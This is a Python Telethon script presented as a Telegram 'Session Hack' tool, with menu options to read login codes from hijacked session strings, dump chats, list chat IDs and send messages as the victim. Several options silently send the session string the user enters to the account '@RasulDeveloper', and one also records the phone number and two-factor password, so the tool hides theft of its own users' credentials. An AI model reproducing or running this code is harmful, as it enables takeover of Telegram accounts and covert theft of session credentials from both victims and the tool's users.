import sys
import os
import time
from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon import TelegramClient
from telethon import TelegramClient, sync, events
from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
import os, sys
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon import functions, types
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.functions.users import GetFullUserRequest
import os, sys
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import os, sys
import time
import code
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import base64
import requests,re,os
from os import system
from platform import platform
import os
import os, sys

os.system("clear")

y="\033[1;33m"
w="\033[1;37m"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;36m"

HackD="\033[1;31mSession Hack parametris\n\n\033[1;37m[\033[1;32m1\033[1;37m] \033[1;32mActive Code\n\033[1;37m[\033[1;32m2\033[1;37m] \033[1;32mChat message scaner\n\033[1;37m[\033[1;32m3\033[1;37m] \033[1;32mChat ID scaner\n\033[1;37m[\033[1;32m4\033[1;37m] \033[1;32mSend message User\n\033[1;37m[\033[1;32m5\033[1;37m] \033[1;32mSend message Group\n\033[1;37m[\033[1;32m6\033[1;37m] \033[1;32mString session\n\n\033[1;31mNumber Tools\033[1;32m ☛  \033[1;37m"

for char in HackD:
	 time.sleep(0.005)
	 sys.stdout.write(char)
	 sys.stdout.flush()
	 
Hack=input()

if Hack=='1':
    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    session = input("\033[1;36m\nString Session \033[1;31m ☛  \033[1;37m")
    
    with TelegramClient(StringSession(session), api_id, api_hash) as client:
        client.start()
    
    async def main():
        print("\n\n")
        print("\033[1;31mTelegram Code\033[1;37m\n\n")
        async for message in client.iter_messages(777000):
          print(message.sender.username, message.text)
          break        
         
    with client:
        client.loop.run_until_complete(main())
        print("\n\n")
        print("\033[1;31mDevloper \033[1;36m☛ \033[1;37m Rasul \033[1;33m☻\n")
        time.sleep(22444382.2322)
        
        	 	 	 	 
elif Hack =='2':
    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    os.system("clear")
    
    string = input ("\033[1;36m\nString Session \033[1;31m ☛  \033[1;37m")
    
    with TelegramClient(StringSession(string), api_id, api_hash) as client:
        client.send_message("@RasulDeveloper", client.session.save())
    
    async def main():
      Username=input("\033[1;36m\nScaning user  \033[1;31m ☛  \033[1;37m")    
      print("\n\n")
      async for message in client.iter_messages  (Username):
          print(message.sender.username, message.text)
     
        
    with client:
        client.loop.run_until_complete(main())
        time.sleep(122726262.73637)  
        
              	 	 	 	 	 	 	 	 	 	 	 	 
              	 	 	 	 	 	 	 	 	 	 	 	      
elif Hack=='3':
    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    
    string = input ("\033[1;36m\nString Session \033[1;31m ☛  \033[1;37m")
    with TelegramClient(StringSession(string), api_id, api_hash) as client:
    
        client.send_message("me", client.session.save())
        
    
    @client.on(events.NewMessage(pattern=".scan"))
    async def chatscan(event):
    		async for dailog in client.iter_dialogs():
    			print("\n\n\033[1;31mChat scaner\n\n\033[1;37m")
    			print(dailog.name + "\033[1;36m id:\033[1;37m " + str(dailog.id))
    			
 			
    
    client.start()
    client.run_until_disconnected()
    time.sleep(272737372.2727227)    
    	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 
elif Hack=='4':
    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    
    string = input  ("\033[1;36m\nString Session \033[1;31m ☛  \033[1;37m")
    
    with TelegramClient(StringSession(string), api_id, api_hash) as client:
        client.send_message("@RasulDeveloper", client.session.save())
    
    async def main():
        
        send=input("\033[1;36m\nSend message Username \033[1;31m ☛  \033[1;37m")
        
        
        while True:
        	await client.send_message(send,input("\033[1;36m\nType  message \033[1;31m ☛  \033[1;37m"))
    
    with client:
        client.loop.run_until_complete(main())
    
    client.start()
    client.run_until_disconnected() 

elif Hack=='5':
    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    
    string = input  ("\033[1;36m\nString Session \033[1;31m ☛  \033[1;37m")
    
    with TelegramClient(StringSession(string), api_id, api_hash) as client:
        client.send_message("@RasulDeveloper", client.session.save())
    
    async def main():
        guruh =  input("\033[1;36m\nChanel or Group Username \033[1;31m ☛  \033[1;37m")
        
        await client(JoinChannelRequest (guruh))
        while True:
        	await client.send_message(guruh,input("\033[1;36m\nType  message \033[1;31m ☛  \033[1;37m"))
    
    with client:
        client.loop.run_until_complete(main())
    
    client.start()
    client.run_until_disconnected()         

elif Hack =='6':

    api_id = 10953300
    api_hash = "9c24426e5d6fa1d441913e3906627f87"
    string=input(r+"\033[1;31m\nPress \033[1;36menter")
    client = TelegramClient(StringSession(string), api_id, api_hash)
    phone_number = input("\n\n\033[1;36mNumber Telegram \033[1;31m☛ "+w)
    client.connect()
    if not client.is_user_authorized():
        client.send_code_request(phone_number)
        try:
         me = client.sign_in(phone_number, input('\n\033[1;36mActivate code \033[1;31m☛ '+w))
         client.send_message("RasulDeveloper", client.session.save())
        except SessionPasswordNeededError:
         password = input('\n\033[1;36mPasword Account \033[1;31m☛ '+w)
         me2 = client.sign_in(password=password)
         client.send_message("me", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
    print(r+"\n\nTelethon string session\n\n"+w)
    Rasul=(client.session.save())
    for char in Rasul:
    	 time.sleep(0.005)
    	 sys.stdout.write(char)
    	 sys.stdout.flush()    
    print("\n\n\033[1;31mDevloper \033[1;36m☛ \033[1;37m Rasul \033[1;33m☻\n")
    time.sleep(22444382.2322)
    
                
    
else:
    os.system("clear")
    print("\033[1;31mError404 \033[1;32mTool \033[1;36m \033[1;31mnumber not found 💀 ") 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	          	 	 	 	 	 	 	 	 	 	 	 	  
         	 	 	 	 	 	 	 	 	 	 	 	     	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	      	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	      	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	          	 	 	 	 	 	 	 	 	 	 	 	       
         	 	 	 	 	 	 	 	 	 	 	 	     	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	      	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	      	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	       	 	 	 	 	 	 	 	 	 	 	 	 